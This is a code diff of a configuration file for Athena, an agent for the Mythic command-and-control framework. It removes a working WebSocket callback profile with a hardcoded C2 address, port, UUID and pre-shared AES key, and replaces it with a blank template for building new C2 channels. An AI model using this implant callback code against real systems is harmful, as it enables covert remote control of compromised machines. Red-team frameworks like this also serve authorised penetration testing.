@@ -1,108 +1,83 @@
 ﻿using Athena.Utilities;
-using System;
-using System.IO;
-using System.Net.WebSockets;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
 using Newtonsoft.Json;
+using System;
+using System.Net;
+using System.Net.Http;
+using System.Threading.Tasks;
 
 namespace Athena.Config
 {
+    //////////////////////////////////////////////////////////////////////////////////////////////////////
+    //Instructions
+    //Replace all TEMPLATE with the name of your C2 Profile
+    //Update the TEMPLATE class with your C2 Profile name, and add the required Properties/Methods
+    //The Send() function is required and should be modified to send the request to the mythic server
+    //The Send() function should then decrypt (if necessary) and return the string as the function result
+    //////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //This class contains the general information about the agent, and should be changed minimally
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     public class MythicConfig
     {
-        public Websocket currentConfig { get; set; }
+        public TEMPLATE currentConfig { get; set; }
         public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public Forwarder forwarder;
+        public Forwarder forwarder { get; set; }
 
         public MythicConfig()
         {
-            uuid = "5279685f-2fd2-45a2-a18a-b646d79ead1d";
+
+            uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("1", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("5", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.currentConfig = new Websocket();
+            this.currentConfig = new TEMPLATE();
             this.forwarder = new Forwarder();
         }
     }
 
-    public class Websocket
+    public class TEMPLATE
     {
-        public string psk { get; set; }
-        public string endpoint { get; set; }
-        public string userAgent { get; set; }
-        public string callbackHost { get; set; }
-        public int callbackInterval { get; set; }
-        public int callbackJitter { get; set; }
-        public int callbackPort { get; set; }
-        public string hostHeader { get; set; }
-        public bool encryptedExchangeCheck { get; set; }
-        public ClientWebSocket ws { get; set; }
-        public PSKCrypto crypt { get; set; }
+        //////////////////////
+        //Properties go here
+        //////////////////////
         public bool encrypted { get; set; }
-        public int connectAttempts { get; set; }
-
-        public Websocket()
+        public string myproperty { get; set; }
+        public PSKCrypto crypt { get; set; }
+        public string psk { get; set; }
+        public bool encryptedExchangeCheck { get; set; }
+        ////////////////////////////////////////////////////
+        //Replace TEMPLATE with the name of your C2 Profile
+        ////////////////////////////////////////////////////
+        public TEMPLATE()
         {
-            int callbackPort = Int32.Parse("8081");
-            string callbackHost = "ws://192.168.4.201";
-            this.endpoint = "socket";
-            string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "USER_AGENT";
-            this.hostHeader = "%HOSTHEADER%";
-            this.psk = "wM7KUzH4xeGsK3sD31MhTH/eNiUBY8sl4yVQXSMFzF8=";
-            this.encryptedExchangeCheck = bool.Parse("false");
+            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            this.psk = "AESPSK";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(MythicConfig.uuid, this.psk);
                 this.encrypted = true;
             }
-
-            this.ws = new ClientWebSocket();
-
-            if (!String.IsNullOrEmpty(this.hostHeader))
-            {
-                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
-            }
-
-            Connect(callbackURL);
+            /////////////////////////////
+            //constructor code goes here
+            /////////////////////////////
         }
-
-        public async Task<bool> Connect(string url)
-        {
-            this.connectAttempts = 0;
-            try
-            {
-                ws = new ClientWebSocket();
-                await ws.ConnectAsync(new Uri(url), CancellationToken.None);
-
-                while (ws.State != WebSocketState.Open)
-                {
-                    if (this.connectAttempts == 300)
-                    {
-                        Environment.Exit(0);
-                    }
-                    await Task.Delay(3000);
-                    this.connectAttempts++;
-                }
-                return true;
-            }
-            catch
-            {
-                return false;
-            }
-        }
-
         public async Task<string> Send(object obj)
         {
             try
             {
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
                 string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
@@ -113,77 +88,44 @@ namespace Athena.Config
                     json = await Misc.Base64Encode(MythicConfig.uuid + json);
                 }
 
-                WebSocketMessage m = new WebSocketMessage()
-                {
-                    Client = true,
-                    Data = json,
-                    Tag = ""
-                };
 
-                string message = JsonConvert.SerializeObject(m);
-                byte[] msg = Encoding.UTF8.GetBytes(message);
-                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
-                message = await Receive(ws);
+                /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                //SEND GOES HERE
+                //Example:
+                //var response = await this.client.PostAsync(Globals.mc.MythicConfig.currentConfig.postURL, new StringContent(json));
+                /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-                if (String.IsNullOrEmpty(message))
-                {
-                    return "";
-                }
+                ///////////////////////////////////////////////////////////
+                //READ THE RESPONSE HERE 
+                //Example:
+                //string msg = response.Content.ReadAsStringAsync().Result;
+                ///////////////////////////////////////////////////////////
 
-                m = JsonConvert.DeserializeObject<WebSocketMessage>(message);
 
+
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                //This will check to see if it needs to be decrypted first and convert the string properly. You can likely keep this here.
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 if (this.encrypted)
                 {
-                    return this.crypt.Decrypt(m.Data);
+                    return this.crypt.Decrypt(json);
                 }
                 else
                 {
-                    return (await Misc.Base64Decode(m.Data)).Substring(36);
+                    if (String.IsNullOrEmpty(json))
+                    {
+                        return json;
+                    }
+                    else
+                    {
+                        return (await Misc.Base64Decode(json)).Substring(36);
+                    }
                 }
             }
             catch
             {
                 return "";
             }
-        }
-        static async Task<string> Receive(ClientWebSocket socket)
-        {
-            try
-            {
-                var buffer = new ArraySegment<byte>(new byte[2048]);
-                do
-                {
-                    WebSocketReceiveResult result;
-                    using (var ms = new MemoryStream())
-                    {
-                        do
-                        {
-                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
-                            await ms.WriteAsync(buffer.Array, buffer.Offset, result.Count);
-                        } while (!result.EndOfMessage);
-
-                        if (result.MessageType == WebSocketMessageType.Close)
-                            break;
-
-                        ms.Seek(0, SeekOrigin.Begin);
-                        using (var reader = new StreamReader(ms, Encoding.UTF8))
-                            return (await reader.ReadToEndAsync());
-                    }
-
-                } while (true);
-
-                return "";
-            }
-            catch
-            {
-                return "";
-            }
-        }
-        private class WebSocketMessage
-        {
-            public bool Client { get; set; }
-            public string Data { get; set; }
-            public string Tag { get; set; }
         }
     }
 }
